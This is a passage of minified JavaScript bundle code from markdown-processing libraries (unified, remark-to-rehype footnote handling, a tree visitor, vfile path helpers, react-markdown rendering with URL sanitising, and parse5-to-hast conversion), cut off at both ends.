r.includes("Array")?[ya,r]:r.includes("Error")?[nm,r]:[Eo,r]},io=([e,t])=>e===Ro&&(t==="function"||t==="symbol"),n3=(e,t,r,a)=>{const o=(l,h)=>{const p=a.push(l)-1;return r.set(h,p),p},s=l=>{if(r.has(l))return r.get(l);let[h,p]=ma(l);switch(h){case Ro:{let T=l;switch(p){case"bigint":h=rm,T=l.toString();break;case"function":case"symbol":if(e)throw new TypeError("unable to serialize "+p);T=null;break;case"undefined":return o([tm],l)}return o([h,T],l)}case ya:{if(p){let _=l;return p==="DataView"?_=new Uint8Array(l.buffer):p==="ArrayBuffer"&&(_=new Uint8Array(l)),o([p,[..._]],l)}const T=[],E=o([h,T],l);for(const _ of l)T.push(s(_));return E}case Eo:{if(p)switch(p){case"BigInt":return o([p,l.toString()],l);case"Boolean":case"Number":case"String":return o([p,l.valueOf()],l)}if(t&&"toJSON"in l)return s(l.toJSON());const T=[],E=o([h,T],l);for(const _ of t3(l))(e||!io(ma(l[_])))&&T.push([s(_),s(l[_])]);return E}case Lc:return o([h,l.toISOString()],l);case kc:{const{source:T,flags:E}=l;return o([h,{source:T,flags:E}],l)}case Ic:{const T=[],E=o([h,T],l);for(const[_,S]of l)(e||!(io(ma(_))||io(ma(S))))&&T.push([s(_),s(S)]);return E}case Nc:{const T=[],E=o([h,T],l);for(const _ of l)(e||!io(ma(_)))&&T.push(s(_));return E}}const{message:g}=l;return o([h,{name:p,message:g}],l)};return s},Sh=(e,{json:t,lossy:r}={})=>{const a=[];return n3(!(t||r),!!t,new Map,a)(e),a},Ei=typeof structuredClone=="function"?(e,t)=>t&&("json"in t||"lossy"in t)?_h(Sh(e,t)):structuredClone(e):(e,t)=>_h(Sh(e,t));function r3(e,t){const r=[{type:"text",value:"↩"}];return t>1&&r.push({type:"element",tagName:"sup",properties:{},children:[{type:"text",value:String(t)}]}),r}function i3(e,t){return"Back to reference "+(e+1)+(t>1?"-"+t:"")}function a3(e){const t=typeof e.options.clobberPrefix=="string"?e.options.clobberPrefix:"user-content-",r=e.options.footnoteBackContent||r3,a=e.options.footnoteBackLabel||i3,o=e.options.footnoteLabel||"Footnotes",s=e.options.footnoteLabelTagName||"h2",l=e.options.footnoteLabelProperties||{className:["sr-only"]},h=[];let p=-1;for(;++p<e.footnoteOrder.length;){const g=e.footnoteById.get(e.footnoteOrder[p]);if(!g)continue;const T=e.all(g),E=String(g.identifier).toUpperCase(),_=Si(E.toLowerCase());let S=0;const I=[],F=e.footnoteCounts.get(E);for(;F!==void 0&&++S<=F;){I.length>0&&I.push({type:"text",value:" "});let Q=typeof r=="string"?r:r(p,S);typeof Q=="string"&&(Q={type:"text",value:Q}),I.push({type:"element",tagName:"a",properties:{href:"#"+t+"fnref-"+_+(S>1?"-"+S:""),dataFootnoteBackref:"",ariaLabel:typeof a=="string"?a:a(p,S),className:["data-footnote-backref"]},children:Array.isArray(Q)?Q:[Q]})}const P=T[T.length-1];if(P&&P.type==="element"&&P.tagName==="p"){const Q=P.children[P.children.length-1];Q&&Q.type==="text"?Q.value+=" ":P.children.push({type:"text",value:" "}),P.children.push(...I)}else T.push(...I);const w={type:"element",tagName:"li",properties:{id:t+"fn-"+_},children:e.wrap(T,!0)};e.patch(g,w),h.push(w)}if(h.length!==0)return{type:"element",tagName:"section",properties:{dataFootnotes:!0,className:["footnotes"]},children:[{type:"element",tagName:s,properties:{...Ei(l),id:"footnote-label"},children:[{type:"text",value:o}]},{type:"text",value:`
`},{type:"element",tagName:"ol",properties:{},children:e.wrap(h,!0)},{type:"text",value:`
`}]}}const Oo=(function(e){if(e==null)return l3;if(typeof e=="function")return Po(e);if(typeof e=="object")return Array.isArray(e)?u3(e):o3(e);if(typeof e=="string")return s3(e);throw new Error("Expected function, string, or object as test")});function u3(e){const t=[];let r=-1;for(;++r<e.length;)t[r]=Oo(e[r]);return Po(a);function a(...o){let s=-1;for(;++s<t.length;)if(t[s].apply(this,o))return!0;return!1}}function o3(e){const t=e;return Po(r);function r(a){const o=a;let s;for(s in e)if(o[s]!==t[s])return!1;return!0}}function s3(e){return Po(t);function t(r){return r&&r.type===e}}function Po(e){return t;function t(r,a,o){return!!(c3(r)&&e.call(this,r,typeof a=="number"?a:void 0,o||void 0))}}function l3(){return!0}function c3(e){return e!==null&&typeof e=="object"&&"type"in e}const im=[],d3=!0,sc=!1,f3="skip";function am(e,t,r,a){let o;typeof t=="function"&&typeof r!="function"?(a=r,r=t):o=t;const s=Oo(o),l=a?-1:1;h(e,void 0,[])();function h(p,g,T){const E=p&&typeof p=="object"?p:{};if(typeof E.type=="string"){const S=typeof E.tagName=="string"?E.tagName:typeof E.name=="string"?E.name:void 0;Object.defineProperty(_,"name",{value:"node ("+(p.type+(S?"<"+S+">":""))+")"})}return _;function _(){let S=im,I,F,P;if((!t||s(p,g,T[T.length-1]||void 0))&&(S=h3(r(p,T)),S[0]===sc))return S;if("children"in p&&p.children){const w=p;if(w.children&&S[0]!==f3)for(F=(a?w.children.length:-1)+l,P=T.concat(w);F>-1&&F<w.children.length;){const Q=w.children[F];if(I=h(Q,F,P)(),I[0]===sc)return I;F=typeof I[1]=="number"?I[1]:F+l}}return S}}}function h3(e){return Array.isArray(e)?e:typeof e=="number"?[d3,e]:e==null?im:[e]}function wo(e,t,r,a){let o,s,l;typeof t=="function"&&typeof r!="function"?(s=void 0,l=t,o=r):(s=t,l=r,o=a),am(e,s,h,o);function h(p,g){const T=g[g.length-1],E=T?T.children.indexOf(p):void 0;return l(p,E,T)}}const lc={}.hasOwnProperty,p3={};function m3(e,t){const r=t||p3,a=new Map,o=new Map,s=new Map,l={...KC,...r.handlers},h={all:g,applyData:E3,definitionById:a,footnoteById:o,footnoteCounts:s,footnoteOrder:[],handlers:l,one:p,options:r,patch:g3,wrap:b3};return wo(e,function(T){if(T.type==="definition"||T.type==="footnoteDefinition"){const E=T.type==="definition"?a:o,_=String(T.identifier).toUpperCase();E.has(_)||E.set(_,T)}}),h;function p(T,E){const _=T.type,S=h.handlers[_];if(lc.call(h.handlers,_)&&S)return S(h,T,E);if(h.options.passThrough&&h.options.passThrough.includes(_)){if("children"in T){const{children:F,...P}=T,w=Ei(P);return w.children=h.all(T),w}return Ei(T)}return(h.options.unknownHandler||T3)(h,T,E)}function g(T){const E=[];if("children"in T){const _=T.children;let S=-1;for(;++S<_.length;){const I=h.one(_[S],T);if(I){if(S&&_[S-1].type==="break"&&(!Array.isArray(I)&&I.type==="text"&&(I.value=yh(I.value)),!Array.isArray(I)&&I.type==="element")){const F=I.children[0];F&&F.type==="text"&&(F.value=yh(F.value))}Array.isArray(I)?E.push(...I):E.push(I)}}}return E}}function g3(e,t){e.position&&(t.position=rS(e))}function E3(e,t){let r=t;if(e&&e.data){const a=e.data.hName,o=e.data.hChildren,s=e.data.hProperties;if(typeof a=="string")if(r.type==="element")r.tagName=a;else{const l="children"in r?r.children:[r];r={type:"element",tagName:a,properties:{},children:l}}r.type==="element"&&s&&Object.assign(r.properties,Ei(s)),"children"in r&&r.children&&o!==null&&o!==void 0&&(r.children=o)}return r}function T3(e,t){const r=t.data||{},a="value"in t&&!(lc.call(r,"hProperties")||lc.call(r,"hChildren"))?{type:"text",value:t.value}:{type:"element",tagName:"div",properties:{},children:e.all(t)};return e.patch(t,a),e.applyData(t,a)}function b3(e,t){const r=[];let a=-1;for(t&&r.push({type:"text",value:`
`});++a<e.length;)a&&r.push({type:"text",value:`
`}),r.push(e[a]);return t&&e.length>0&&r.push({type:"text",value:`
`}),r}function yh(e){let t=0,r=e.charCodeAt(t);for(;r===9||r===32;)t++,r=e.charCodeAt(t);return e.slice(t)}function Ch(e,t){const r=m3(e,t),a=r.one(e,void 0),o=a3(r),s=Array.isArray(a)?{type:"root",children:a}:a||{type:"root",children:[]};return o&&s.children.push({type:"text",value:`
`},o),s}function _3(e,t){return e&&"run"in e?async function(r,a){const o=Ch(r,{file:a,...t});await e.run(o,a)}:function(r,a){return Ch(r,{file:a,...e||t})}}function xh(e){if(e)throw e}var Ml,Ah;function S3(){if(Ah)return Ml;Ah=1;var e=Object.prototype.hasOwnProperty,t=Object.prototype.toString,r=Object.defineProperty,a=Object.getOwnPropertyDescriptor,o=function(g){return typeof Array.isArray=="function"?Array.isArray(g):t.call(g)==="[object Array]"},s=function(g){if(!g||t.call(g)!=="[object Object]")return!1;var T=e.call(g,"constructor"),E=g.constructor&&g.constructor.prototype&&e.call(g.constructor.prototype,"isPrototypeOf");if(g.constructor&&!T&&!E)return!1;var _;for(_ in g);return typeof _>"u"||e.call(g,_)},l=function(g,T){r&&T.name==="__proto__"?r(g,T.name,{enumerable:!0,configurable:!0,value:T.newValue,writable:!0}):g[T.name]=T.newValue},h=function(g,T){if(T==="__proto__")if(e.call(g,T)){if(a)return a(g,T).value}else return;return g[T]};return Ml=function p(){var g,T,E,_,S,I,F=arguments[0],P=1,w=arguments.length,Q=!1;for(typeof F=="boolean"&&(Q=F,F=arguments[1]||{},P=2),(F==null||typeof F!="object"&&typeof F!="function")&&(F={});P<w;++P)if(g=arguments[P],g!=null)for(T in g)E=h(F,T),_=h(g,T),F!==_&&(Q&&_&&(s(_)||(S=o(_)))?(S?(S=!1,I=E&&o(E)?E:[]):I=E&&s(E)?E:{},l(F,{name:T,newValue:p(Q,I,_)})):typeof _<"u"&&l(F,{name:T,newValue:_}));return F},Ml}var y3=S3();const Fl=yo(y3);function cc(e){if(typeof e!="object"||e===null)return!1;const t=Object.getPrototypeOf(e);return(t===null||t===Object.prototype||Object.getPrototypeOf(t)===null)&&!(Symbol.toStringTag in e)&&!(Symbol.iterator in e)}function C3(){const e=[],t={run:r,use:a};return t;function r(...o){let s=-1;const l=o.pop();if(typeof l!="function")throw new TypeError("Expected function as last argument, not "+l);h(null,...o);function h(p,...g){const T=e[++s];let E=-1;if(p){l(p);return}for(;++E<o.length;)(g[E]===null||g[E]===void 0)&&(g[E]=o[E]);o=g,T?x3(T,h)(...g):l(null,...g)}}function a(o){if(typeof o!="function")throw new TypeError("Expected `middelware` to be a function, not "+o);return e.push(o),t}}function x3(e,t){let r;return a;function a(...l){const h=e.length>l.length;let p;h&&l.push(o);try{p=e.apply(this,l)}catch(g){const T=g;if(h&&r)throw T;return o(T)}h||(p&&p.then&&typeof p.then=="function"?p.then(s,o):p instanceof Error?o(p):s(p))}function o(l,...h){r||(r=!0,t(l,...h))}function s(l){o(null,l)}}const gn={basename:A3,dirname:L3,extname:k3,join:I3,sep:"/"};function A3(e,t){if(t!==void 0&&typeof t!="string")throw new TypeError('"ext" argument must be a string');Ua(e);let r=0,a=-1,o=e.length,s;if(t===void 0||t.length===0||t.length>e.length){for(;o--;)if(e.codePointAt(o)===47){if(s){r=o+1;break}}else a<0&&(s=!0,a=o+1);return a<0?"":e.slice(r,a)}if(t===e)return"";let l=-1,h=t.length-1;for(;o--;)if(e.codePointAt(o)===47){if(s){r=o+1;break}}else l<0&&(s=!0,l=o+1),h>-1&&(e.codePointAt(o)===t.codePointAt(h--)?h<0&&(a=o):(h=-1,a=l));return r===a?a=l:a<0&&(a=e.length),e.slice(r,a)}function L3(e){if(Ua(e),e.length===0)return".";let t=-1,r=e.length,a;for(;--r;)if(e.codePointAt(r)===47){if(a){t=r;break}}else a||(a=!0);return t<0?e.codePointAt(0)===47?"/":".":t===1&&e.codePointAt(0)===47?"//":e.slice(0,t)}function k3(e){Ua(e);let t=e.length,r=-1,a=0,o=-1,s=0,l;for(;t--;){const h=e.codePointAt(t);if(h===47){if(l){a=t+1;break}continue}r<0&&(l=!0,r=t+1),h===46?o<0?o=t:s!==1&&(s=1):o>-1&&(s=-1)}return o<0||r<0||s===0||s===1&&o===r-1&&o===a+1?"":e.slice(o,r)}function I3(...e){let t=-1,r;for(;++t<e.length;)Ua(e[t]),e[t]&&(r=r===void 0?e[t]:r+"/"+e[t]);return r===void 0?".":N3(r)}function N3(e){Ua(e);const t=e.codePointAt(0)===47;let r=v3(e,!t);return r.length===0&&!t&&(r="."),r.length>0&&e.codePointAt(e.length-1)===47&&(r+="/"),t?"/"+r:r}function v3(e,t){let r="",a=0,o=-1,s=0,l=-1,h,p;for(;++l<=e.length;){if(l<e.length)h=e.codePointAt(l);else{if(h===47)break;h=47}if(h===47){if(!(o===l-1||s===1))if(o!==l-1&&s===2){if(r.length<2||a!==2||r.codePointAt(r.length-1)!==46||r.codePointAt(r.length-2)!==46){if(r.length>2){if(p=r.lastIndexOf("/"),p!==r.length-1){p<0?(r="",a=0):(r=r.slice(0,p),a=r.length-1-r.lastIndexOf("/")),o=l,s=0;continue}}else if(r.length>0){r="",a=0,o=l,s=0;continue}}t&&(r=r.length>0?r+"/..":"..",a=2)}else r.length>0?r+="/"+e.slice(o+1,l):r=e.slice(o+1,l),a=l-o-1;o=l,s=0}else h===46&&s>-1?s++:s=-1}return r}function Ua(e){if(typeof e!="string")throw new TypeError("Path must be a string. Received "+JSON.stringify(e))}const R3={cwd:O3};function O3(){return"/"}function dc(e){return!!(e!==null&&typeof e=="object"&&"href"in e&&e.href&&"protocol"in e&&e.protocol&&e.auth===void 0)}function P3(e){if(typeof e=="string")e=new URL(e);else if(!dc(e)){const t=new TypeError('The "path" argument must be of type string or an instance of URL. Received `'+e+"`");throw t.code="ERR_INVALID_ARG_TYPE",t}if(e.protocol!=="file:"){const t=new TypeError("The URL must be of scheme file");throw t.code="ERR_INVALID_URL_SCHEME",t}return w3(e)}function w3(e){if(e.hostname!==""){const a=new TypeError('File URL host must be "localhost" or empty on darwin');throw a.code="ERR_INVALID_FILE_URL_HOST",a}const t=e.pathname;let r=-1;for(;++r<t.length;)if(t.codePointAt(r)===37&&t.codePointAt(r+1)===50){const a=t.codePointAt(r+2);if(a===70||a===102){const o=new TypeError("File URL path must not include encoded / characters");throw o.code="ERR_INVALID_FILE_URL_PATH",o}}return decodeURIComponent(t)}const Bl=["history","path","basename","stem","extname","dirname"];class um{constructor(t){let r;t?dc(t)?r={path:t}:typeof t=="string"||D3(t)?r={value:t}:r=t:r={},this.cwd="cwd"in r?"":R3.cwd(),this.data={},this.history=[],this.messages=[],this.value,this.map,this.result,this.stored;let a=-1;for(;++a<Bl.length;){const s=Bl[a];s in r&&r[s]!==void 0&&r[s]!==null&&(this[s]=s==="history"?[...r[s]]:r[s])}let o;for(o in r)Bl.includes(o)||(this[o]=r[o])}get basename(){return typeof this.path=="string"?gn.basename(this.path):void 0}set basename(t){Ul(t,"basename"),Hl(t,"basename"),this.path=gn.join(this.dirname||"",t)}get dirname(){return typeof this.path=="string"?gn.dirname(this.path):void 0}set dirname(t){Lh(this.basename,"dirname"),this.path=gn.join(t||"",this.basename)}get extname(){return typeof this.path=="string"?gn.extname(this.path):void 0}set extname(t){if(Hl(t,"extname"),Lh(this.dirname,"extname"),t){if(t.codePointAt(0)!==46)throw new Error("`extname` must start with `.`");if(t.includes(".",1))throw new Error("`extname` cannot contain multiple dots")}this.path=gn.join(this.dirname,this.stem+(t||""))}get path(){return this.history[this.history.length-1]}set path(t){dc(t)&&(t=P3(t)),Ul(t,"path"),this.path!==t&&this.history.push(t)}get stem(){return typeof this.path=="string"?gn.basename(this.path,this.extname):void 0}set stem(t){Ul(t,"stem"),Hl(t,"stem"),this.path=gn.join(this.dirname||"",t+(this.extname||""))}fail(t,r,a){const o=this.message(t,r,a);throw o.fatal=!0,o}info(t,r,a){const o=this.message(t,r,a);return o.fatal=void 0,o}message(t,r,a){const o=new yt(t,r,a);return this.path&&(o.name=this.path+":"+o.name,o.file=this.path),o.fatal=!1,this.messages.push(o),o}toString(t){return this.value===void 0?"":typeof this.value=="string"?this.value:new TextDecoder(t||void 0).decode(this.value)}}function Hl(e,t){if(e&&e.includes(gn.sep))throw new Error("`"+t+"` cannot be a path: did not expect `"+gn.sep+"`")}function Ul(e,t){if(!e)throw new Error("`"+t+"` cannot be empty")}function Lh(e,t){if(!e)throw new Error("Setting `"+t+"` requires `path` to be set too")}function D3(e){return!!(e&&typeof e=="object"&&"byteLength"in e&&"byteOffset"in e)}const M3=(function(e){const a=this.constructor.prototype,o=a[e],s=function(){return o.apply(s,arguments)};return Object.setPrototypeOf(s,a),s}),F3={}.hasOwnProperty;class vc extends M3{constructor(){super("copy"),this.Compiler=void 0,this.Parser=void 0,this.attachers=[],this.compiler=void 0,this.freezeIndex=-1,this.frozen=void 0,this.namespace={},this.parser=void 0,this.transformers=C3()}copy(){const t=new vc;let r=-1;for(;++r<this.attachers.length;){const a=this.attachers[r];t.use(...a)}return t.data(Fl(!0,{},this.namespace)),t}data(t,r){return typeof t=="string"?arguments.length===2?(jl("data",this.frozen),this.namespace[t]=r,this):F3.call(this.namespace,t)&&this.namespace[t]||void 0:t?(jl("data",this.frozen),this.namespace=t,this):this.namespace}freeze(){if(this.frozen)return this;const t=this;for(;++this.freezeIndex<this.attachers.length;){const[r,...a]=this.attachers[this.freezeIndex];if(a[0]===!1)continue;a[0]===!0&&(a[0]=void 0);const o=r.call(t,...a);typeof o=="function"&&this.transformers.use(o)}return this.frozen=!0,this.freezeIndex=Number.POSITIVE_INFINITY,this}parse(t){this.freeze();const r=ao(t),a=this.parser||this.Parser;return zl("parse",a),a(String(r),r)}process(t,r){const a=this;return this.freeze(),zl("process",this.parser||this.Parser),Wl("process",this.compiler||this.Compiler),r?o(void 0,r):new Promise(o);function o(s,l){const h=ao(t),p=a.parse(h);a.run(p,h,function(T,E,_){if(T||!E||!_)return g(T);const S=E,I=a.stringify(S,_);U3(I)?_.value=I:_.result=I,g(T,_)});function g(T,E){T||!E?l(T):s?s(E):r(void 0,E)}}}processSync(t){let r=!1,a;return this.freeze(),zl("processSync",this.parser||this.Parser),Wl("processSync",this.compiler||this.Compiler),this.process(t,o),Ih("processSync","process",r),a;function o(s,l){r=!0,xh(s),a=l}}run(t,r,a){kh(t),this.freeze();const o=this.transformers;return!a&&typeof r=="function"&&(a=r,r=void 0),a?s(void 0,a):new Promise(s);function s(l,h){const p=ao(r);o.run(t,p,g);function g(T,E,_){const S=E||t;T?h(T):l?l(S):a(void 0,S,_)}}}runSync(t,r){let a=!1,o;return this.run(t,r,s),Ih("runSync","run",a),o;function s(l,h){xh(l),o=h,a=!0}}stringify(t,r){this.freeze();const a=ao(r),o=this.compiler||this.Compiler;return Wl("stringify",o),kh(t),o(t,a)}use(t,...r){const a=this.attachers,o=this.namespace;if(jl("use",this.frozen),t!=null)if(typeof t=="function")p(t,r);else if(typeof t=="object")Array.isArray(t)?h(t):l(t);else throw new TypeError("Expected usable value, not `"+t+"`");return this;function s(g){if(typeof g=="function")p(g,[]);else if(typeof g=="object")if(Array.isArray(g)){const[T,...E]=g;p(T,E)}else l(g);else throw new TypeError("Expected usable value, not `"+g+"`")}function l(g){if(!("plugins"in g)&&!("settings"in g))throw new Error("Expected usable value but received an empty preset, which is probably a mistake: presets typically come with `plugins` and sometimes with `settings`, but this has neither");h(g.plugins),g.settings&&(o.settings=Fl(!0,o.settings,g.settings))}function h(g){let T=-1;if(g!=null)if(Array.isArray(g))for(;++T<g.length;){const E=g[T];s(E)}else throw new TypeError("Expected a list of plugins, not `"+g+"`")}function p(g,T){let E=-1,_=-1;for(;++E<a.length;)if(a[E][0]===g){_=E;break}if(_===-1)a.push([g,...T]);else if(T.length>0){let[S,...I]=T;const F=a[_][1];cc(F)&&cc(S)&&(S=Fl(!0,F,S)),a[_]=[g,S,...I]}}}}const B3=new vc().freeze();function zl(e,t){if(typeof t!="function")throw new TypeError("Cannot `"+e+"` without `parser`")}function Wl(e,t){if(typeof t!="function")throw new TypeError("Cannot `"+e+"` without `compiler`")}function jl(e,t){if(t)throw new Error("Cannot call `"+e+"` on a frozen processor.\nCreate a new processor first, by calling it: use `processor()` instead of `processor`.")}function kh(e){if(!cc(e)||typeof e.type!="string")throw new TypeError("Expected node, got `"+e+"`")}function Ih(e,t,r){if(!r)throw new Error("`"+e+"` finished async. Use `"+t+"` instead")}function ao(e){return H3(e)?e:new um(e)}function H3(e){return!!(e&&typeof e=="object"&&"message"in e&&"messages"in e)}function U3(e){return typeof e=="string"||z3(e)}function z3(e){return!!(e&&typeof e=="object"&&"byteLength"in e&&"byteOffset"in e)}const W3="https://github.com/remarkjs/react-markdown/blob/main/changelog.md",Nh=[],vh={allowDangerousHtml:!0},j3=/^(https?|ircs?|mailto|xmpp)$/i,Q3=[{from:"astPlugins",id:"remove-buggy-html-in-markdown-parser"},{from:"allowDangerousHtml",id:"remove-buggy-html-in-markdown-parser"},{from:"allowNode",id:"replace-allownode-allowedtypes-and-disallowedtypes",to:"allowElement"},{from:"allowedTypes",id:"replace-allownode-allowedtypes-and-disallowedtypes",to:"allowedElements"},{from:"className",id:"remove-classname"},{from:"disallowedTypes",id:"replace-allownode-allowedtypes-and-disallowedtypes",to:"disallowedElements"},{from:"escapeHtml",id:"remove-buggy-html-in-markdown-parser"},{from:"includeElementIndex",id:"#remove-includeelementindex"},{from:"includeNodeIndex",id:"change-includenodeindex-to-includeelementindex"},{from:"linkTarget",id:"remove-linktarget"},{from:"plugins",id:"change-plugins-to-remarkplugins",to:"remarkPlugins"},{from:"rawSourcePos",id:"#remove-rawsourcepos"},{from:"renderers",id:"change-renderers-to-components",to:"components"},{from:"source",id:"change-source-to-children",to:"children"},{from:"sourcePos",id:"#remove-sourcepos"},{from:"transformImageUri",id:"#add-urltransform",to:"urlTransform"},{from:"transformLinkUri",id:"#add-urltransform",to:"urlTransform"}];function Y3(e){const t=X3(e),r=G3(e);return V3(t.runSync(t.parse(r),r),e)}function X3(e){const t=e.rehypePlugins||Nh,r=e.remarkPlugins||Nh,a=e.remarkRehypeOptions?{...e.remarkRehypeOptions,...vh}:vh;return B3().use(AC).use(r).use(_3,a).use(t)}function G3(e){const t=e.children||"",r=new um;return typeof t=="string"&&(r.value=t),r}function V3(e,t){const r=t.allowedElements,a=t.allowElement,o=t.components,s=t.disallowedElements,l=t.skipHtml,h=t.unwrapDisallowed,p=t.urlTransform||$3;for(const T of Q3)Object.hasOwn(t,T.from)&&(""+T.from+(T.to?"use `"+T.to+"` instead":"remove it")+W3+T.id,void 0);return wo(e,g),sS(e,{Fragment:v.Fragment,components:o,ignoreInvalidStyle:!0,jsx:v.jsx,jsxs:v.jsxs,passKeys:!0,passNode:!0});function g(T,E,_){if(T.type==="raw"&&_&&typeof E=="number")return l?_.children.splice(E,1):_.children[E]={type:"text",value:T.value},E;if(T.type==="element"){let S;for(S in Pl)if(Object.hasOwn(Pl,S)&&Object.hasOwn(T.properties,S)){const I=T.properties[S],F=Pl[S];(F===null||F.includes(T.tagName))&&(T.properties[S]=p(String(I||""),S,T))}}if(T.type==="element"){let S=r?!r.includes(T.tagName):s?s.includes(T.tagName):!1;if(!S&&a&&typeof E=="number"&&(S=!a(T,E,_)),S&&_&&typeof E=="number")return h&&T.children?_.children.splice(E,1,...T.children):_.children.splice(E,1),E}}}function $3(e){const t=e.indexOf(":"),r=e.indexOf("?"),a=e.indexOf("#"),o=e.indexOf("/");return t===-1||o!==-1&&t>o||r!==-1&&t>r||a!==-1&&t>a||j3.test(e.slice(0,t))?e:""}const Rh=/[#.]/g;function q3(e,t){const r=e||"",a={};let o=0,s,l;for(;o<r.length;){Rh.lastIndex=o;const h=Rh.exec(r),p=r.slice(o,h?h.index:r.length);p&&(s?s==="#"?a.id=p:Array.isArray(a.className)?a.className.push(p):a.className=[p]:l=p,o+=p.length),h&&(s=h[0],o++)}return{type:"element",tagName:l||t||"div",properties:a,children:[]}}function om(e,t,r){const a=r?ex(r):void 0;function o(s,l,...h){let p;if(s==null){p={type:"root",children:[]};const g=l;h.unshift(g)}else{p=q3(s,t);const g=p.tagName.toLowerCase(),T=a?a.get(g):void 0;if(p.tagName=T||g,K3(l))h.unshift(l);else for(const[E,_]of Object.entries(l))J3(e,p.properties,E,_)}for(const g of h)fc(p.children,g);return p.type==="element"&&p.tagName==="template"&&(p.content={type:"root",children:p.children},p.children=[]),p}return o}function K3(e){if(e===null||typeof e!="object"||Array.isArray(e))return!0;if(typeof e.type!="string")return!1;const t=e,r=Object.keys(e);for(const a of r){const o=t[a];if(o&&typeof o=="object"){if(!Array.isArray(o))return!0;const s=o;for(const l of s)if(typeof l!="number"&&typeof l!="string")return!0}}return!!("children"in e&&Array.isArray(e.children))}function J3(e,t,r,a){const o=ko(e,r);let s;if(a!=null){if(typeof a=="number"){if(Number.isNaN(a))return;s=a}else typeof a=="boolean"?s=a:typeof a=="string"?o.spaceSeparated?s=J0(a):o.commaSeparated?s=G0(a):o.commaOrSpaceSeparated?s=J0(G0(a).join(" ")):s=Oh(o,o.property,a):Array.isArray(a)?s=[...a]:s=o.property==="style"?Z3(a):String(a);if(Array.isArray(s)){const l=[];for(const h of s)l.push(Oh(o,o.property,h));s=l}o.property==="className"&&Array.isArray(t.className)&&(s=t.className.concat(s)),t[o.property]=s}}function fc(e,t){if(t!=null)if(typeof t=="number"||typeof t=="string")e.push({type:"text",value:String(t)});else if(Array.isArray(t))for(const r of t)fc(e,r);else if(typeof t=="object"&&"type"in t)t.type==="root"?fc(e,t.children):e.push(t);else throw new Error("Expected node, nodes, or string, got `"+t+"`")}function Oh(e,t,r){if(typeof r=="string"){if(e.number&&r&&!Number.isNaN(Number(r)))return Number(r);if((e.boolean||e.overloadedBoolean)&&(r===""||Ra(r)===Ra(t)))return!0}return r}function Z3(e){const t=[];for(const[r,a]of Object.entries(e))t.push([r,a].join(": "));return t.join("; ")}function ex(e){const t=new Map;for(const r of e)t.set(r.toLowerCase(),r);return t}const tx=["altGlyph","altGlyphDef","altGlyphItem","animateColor","animateMotion","animateTransform","clipPath","feBlend","feColorMatrix","feComponentTransfer","feComposite","feConvolveMatrix","feDiffuseLighting","feDisplacementMap","feDistantLight","feDropShadow","feFlood","feFuncA","feFuncB","feFuncG","feFuncR","feGaussianBlur","feImage","feMerge","feMergeNode","feMorphology","feOffset","fePointLight","feSpecularLighting","feSpotLight","feTile","feTurbulence","foreignObject","glyphRef","linearGradient","radialGradient","solidColor","textArea","textPath"],nx=om(Ba,"div"),rx=om(cr,"g",tx);function ix(e){const t=String(e),r=[];return{toOffset:o,toPoint:a};function a(s){if(typeof s=="number"&&s>-1&&s<=t.length){let l=0;for(;;){let h=r[l];if(h===void 0){const p=Ph(t,r[l-1]);h=p===-1?t.length+1:p+1,r[l]=h}if(h>s)return{line:l+1,column:s-(l>0?r[l-1]:0)+1,offset:s};l++}}}function o(s){if(s&&typeof s.line=="number"&&typeof s.column=="number"&&!Number.isNaN(s.line)&&!Number.isNaN(s.column)){for(;r.length<s.line;){const h=r[r.length-1],p=Ph(t,h),g=p===-1?t.length+1:p+1;if(h===g)break;r.push(g)}const l=(s.line>1?r[s.line-2]:0)+s.column-1;if(l<r[s.line-1])return l}}}function Ph(e,t){const r=e.indexOf("\r",t),a=e.indexOf(`
`,t);return a===-1?r:r===-1||r+1===a?a:r<a?r:a}const kr={html:"http://www.w3.org/1999/xhtml",mathml:"http://www.w3.org/1998/Math/MathML",svg:"http://www.w3.org/2000/svg",xlink:"http://www.w3.org/1999/xlink",xml:"http://www.w3.org/XML/1998/namespace",xmlns:"http://www.w3.org/2000/xmlns/"},sm={}.hasOwnProperty,ax=Object.prototype;function ux(e,t){const r=t||{};return Rc({file:r.file||void 0,location:!1,schema:r.space==="svg"?cr:Ba,verbose:r.verbose||!1},e)}function Rc(e,t){let r;switch(t.nodeName){case"#comment":{const a=t;return r={type:"comment",value:a.data},fo(e,a,r),r}case"#document":case"#document-fragment":{const a=t,o="mode"in a?a.mode==="quirks"||a.mode==="limited-quirks":!1;if(r={type:"root",children:lm(e,t.childNodes),data:{quirksMode:o}},e.file&&e.location){const s=String(e.file),l=ix(s),h=l.toPoint(0),p=l.toPoint(s.length);r.position={start:h,end:p}}return r}case"#documentType":{const a=t;return r={type:"doctype"},fo(e,a,r),r}case"#text":{const a=t;return r={type:"text",value:a.value},fo(e,a,r),r}default:return r=ox(e,t),r}}function lm(e,t){let r=-1;const a=[];for(;++r<t.length;){const o=Rc(e,t[r]);a.push(o)}return a}function ox(e,t){const r=e.schema;e.schema=t.namespaceURI===kr.svg?cr:Ba;let a=-1;const o={};for(;++a<t.attrs.length;){const h=t.attrs[a],p=(h.prefix?h.prefix+":":"")+h.name;sm.call(ax,p)||(o[p]=h.value)}const l=(e.schema.space==="svg"?rx:nx)(t.tagName,o,lm(e,t.childNodes));if(fo(e,t,l),l.tagName==="template"){const h=t,p=h.sourceCodeLocation,g=p&&p.startTag&&di(p.startTag),T=p&&p.endTag&&di(p.endTag),E=Rc(e,h.content);g&&T&&e.file&&(E.position={start:g.end,end:T.start}),l.content=E}return e.schema=r,l}function fo(e,t,r){if("sourceCodeLocation"in t&&t.sourceCodeLocation&&e.file){const a=sx(e,r,t.sourceCodeLocation);a&&(e.location=!0,r.position=a)}}function sx(e,t,r){const a=di(r);if(t.type==="element"){const o=t.children[t.children.length-1];if(a&&!r.endTag&&o&&o.position&&o.position.end&&(a.end=Object.assign({},o.position.end)),e.verbose){const s={};let l;if(r.attrs)for(l in r.attrs)sm.call(r.attrs,l)&&(s[ko(e.schema,l).property]=di(r.attrs[l]));r.startTag;const h=di(r.startTag),p=r.endTag?di(r.endTag):void 0,g={opening:h};p&&(g.closing=p),g.properties=s,t.data={position:g}}}return a}function di(e){const t=wh({line:e.startLine,column:e.startCol,offset:e.startOffset}),r=wh({line:e.endLine,column:e.endCol,offset:e.endOffset});return t||r?{start:t,end:r}:void 0}function wh(e){return e.line&&e.column?e:void 0}const Dh={}.hasOwnProperty;function cm(e,t){const r=t||{};function a(o,...s){let l=a.invalid;const h=a.handlers;if(o&&Dh.call(o,e)){const 